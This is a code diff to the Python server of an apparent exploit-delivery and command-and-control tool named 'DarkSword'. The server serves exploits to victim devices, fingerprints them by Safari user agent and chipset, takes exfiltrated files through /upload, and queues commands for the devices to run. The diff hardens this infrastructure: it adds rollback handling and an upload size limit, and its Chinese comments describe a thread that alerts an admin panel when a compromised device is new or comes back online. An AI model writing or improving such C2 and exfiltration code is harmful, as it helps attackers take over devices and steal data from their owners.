@@ -3,15 +3,20 @@
 import base64
 import json
 import re
+import threading
+import urllib.request
+import urllib.error
 from datetime import datetime
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from pathlib import Path
 from urllib.parse import urlparse
-from typing import Optional
+from typing import Optional, Tuple
 
 from .config import get_payloads_dir, get_templates_dir, ServeConfig
 
 EXFIL_DIR: Optional[Path] = None
+MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB
+ADMIN_REGISTER_URL = "http://127.0.0.1:8000/api/devices/register"
 
 try:
     from admin.database import SessionLocal, Log, Device, ExfilData, Command
@@ -25,6 +30,7 @@ def save_log_to_db(log_type: str, ip: str, method: str = None, path: str = None,
                    device_uuid: str = None):
     if not DB_AVAILABLE:
         return
+    db = None
     try:
         db = SessionLocal()
         log = Log(
@@ -40,9 +46,12 @@ def save_log_to_db(log_type: str, ip: str, method: str = None, path: str = None,
         )
         db.add(log)
         db.commit()
-        db.close()
     except Exception:
-        pass
+        if db:
+            db.rollback()
+    finally:
+        if db:
+            db.close()
 
 
 def parse_user_agent(user_agent: str):
@@ -79,18 +88,66 @@ def parse_user_agent(user_agent: str):
     return os_version, safari_version, device_model, chipset
 
 
-def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None):
+def notify_admin_register_async(device_uuid: str, user_agent: str = None,
+                                force_is_new: bool = False, force_was_offline: bool = False) -> None:
+    """后台线程回调管理后台 /api/devices/register → 管理后台进程内创建通知并 SSE 广播.
+
+    漏洞服务器(8080)和管理后台(8000)是两个独立进程，内存中的 SSE 队列不共享，
+    必须通过 HTTP 让管理后台自己的进程处理通知广播。
+
+    force_* 参数：两个进程共用 SQLite，漏洞服务器已经把设备写进 DB，管理后台再查
+    会认为设备已存在 → 由漏洞服务器传 force_* 强制触发对应通知分支。
+    """
+    def _post():
+        try:
+            payload = json.dumps({
+                "device_uuid": device_uuid,
+                "user_agent": user_agent or "",
+                "force_is_new": bool(force_is_new),
+                "force_was_offline": bool(force_was_offline),
+            }).encode("utf-8")
+            req = urllib.request.Request(
+                ADMIN_REGISTER_URL,
+                data=payload,
+                method="POST",
+                headers={
+                    "Content-Type": "application/json",
+                    "User-Agent": "DarkSword-Exploit-Server/1.0",
+                },
+            )
+            with urllib.request.urlopen(req, timeout=2.0) as resp:
+                resp.read()
+        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError, OSError):
+            pass
+        except Exception:
+            pass
+
+    try:
+        t = threading.Thread(target=_post, name="ds-admin-notify", daemon=True)
+        t.start()
+    except Exception:
+        pass
+
+
+def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None) -> Tuple[bool, bool]:
+    """更新或创建设备记录，返回 (is_new: 是否新设备, was_offline: 是否由 offline 重新上线)."""
+    is_new = False
+    was_offline = False
     if not DB_AVAILABLE:
-        return
+        return is_new, was_offline
+    db = None
     try:
         db = SessionLocal()
         device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
-        
+
         os_version, safari_version, device_model, chipset = parse_user_agent(user_agent)
-        
+
         if device:
+            if device.status == "offline":
+                was_offline = True
             device.last_seen = datetime.now()
             device.ip = ip
+            device.status = "active"
             if user_agent:
                 device.user_agent = user_agent
             if os_version and not device.os_version:
@@ -102,6 +159,7 @@ def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None):
             if chipset and not device.chipset:
                 device.chipset = chipset
         else:
+            is_new = True
             device = Device(
                 device_uuid=device_uuid,
                 first_seen=datetime.now(),
@@ -116,15 +174,21 @@ def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None):
             )
             db.add(device)
         db.commit()
-        db.close()
     except Exception:
-        pass
+        if db:
+            db.rollback()
+        is_new, was_offline = False, False
+    finally:
+        if db:
+            db.close()
+    return is_new, was_offline
 
 
 def save_exfil_to_db(device_uuid: str, category: str, path: str, description: str, 
                      file_path: str, file_size: int):
     if not DB_AVAILABLE:
         return
+    db = None
     try:
         db = SessionLocal()
         exfil = ExfilData(
@@ -138,15 +202,19 @@ def save_exfil_to_db(device_uuid: str, category: str, path: str, description: st
         )
         db.add(exfil)
         db.commit()
-        db.close()
     except Exception:
-        pass
+        if db:
+            db.rollback()
+    finally:
+        if db:
+            db.close()
 
 
 
 def get_pending_command(device_uuid: str):
     if not DB_AVAILABLE:
         return None
+    db = None
     try:
         db = SessionLocal()
         command = db.query(Command).filter(
@@ -156,15 +224,19 @@ def get_pending_command(device_uuid: str):
         if command:
             command.status = 'executing'
             db.commit()
-            db.close()
             return {'id': command.id, 'command': command.command}
-        db.close()
+        return None
     except Exception:
-        pass
-    return None
+        if db:
+            db.rollback()
+        return None
+    finally:
+        if db:
+            db.close()
 def update_command_result(command_id: int, output: str, status: str = 'completed'):
     if not DB_AVAILABLE:
         return None
+    db = None
     try:
         db = SessionLocal()
         command = db.query(Command).filter(Command.id == command_id).first()
@@ -173,9 +245,12 @@ def update_command_result(command_id: int, output: str, status: str = 'completed
             command.output = output
             command.executed_at = datetime.now()
             db.commit()
-            db.close()
     except Exception:
-        pass
+        if db:
+            db.rollback()
+    finally:
+        if db:
+            db.close()
 def log_to_file(msg: str, log_path: Optional[Path] = None) -> None:
     """Write log message to file."""
     if log_path:
@@ -208,8 +283,16 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
 
     def end_headers(self) -> None:
         """Add CORS and security headers for exploit delivery."""
-        self.send_header("Access-Control-Allow-Origin", "*")
+        origin = self.headers.get("Origin", "")
+        if origin.startswith("http://localhost") or origin.startswith("http://127.0.0.1"):
+            self.send_header("Access-Control-Allow-Origin", origin)
+        else:
+            self.send_header("Access-Control-Allow-Origin", "null")
+        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "Content-Type")
         self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
+        self.send_header("X-Content-Type-Options", "nosniff")
+        self.send_header("X-Frame-Options", "DENY")
         super().end_headers()
 
     def _get_c2_host_port(self) -> tuple:
@@ -313,7 +396,11 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
             device_uuid = hashlib.md5(hash_input.encode()).hexdigest()[:32]
         
         if device_uuid:
-            update_device_in_db(device_uuid, client_ip, user_agent)
+            is_new, was_offline = update_device_in_db(device_uuid, client_ip, user_agent)
+            if is_new or was_offline:
+                notify_admin_register_async(device_uuid, user_agent,
+                                            force_is_new=is_new,
+                                            force_was_offline=was_offline)
         
         request_log = f"GET {self.path} from {client_ip}"
         if device_uuid:
@@ -379,6 +466,14 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
     def do_POST(self) -> None:
         """Handle POST - /upload receives exfiltrated data from payload."""
         content_length = int(self.headers.get("Content-Length", 0))
+        
+        if content_length > MAX_UPLOAD_SIZE:
+            self.send_response(413)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"error": "Payload too large"}).encode())
+            return
+        
         body = self.rfile.read(content_length) if content_length else b""
         parsed = urlparse(self.path)
         client_ip = self.client_address[0] if self.client_address else "unknown"
@@ -439,7 +534,15 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
             client_ip = self.client_address[0] if self.client_address else "unknown"
             user_agent = self.headers.get("User-Agent", "")
             
-            update_device_in_db(device, client_ip, user_agent)
+            update_device_result = update_device_in_db(device, client_ip, user_agent)
+            try:
+                is_new_exfil, was_offline_exfil = update_device_result
+                if is_new_exfil or was_offline_exfil:
+                    notify_admin_register_async(device, user_agent,
+                                                force_is_new=is_new_exfil,
+                                                force_was_offline=was_offline_exfil)
+            except Exception:
+                pass
             
             if b64:
                 raw = base64.b64decode(b64)
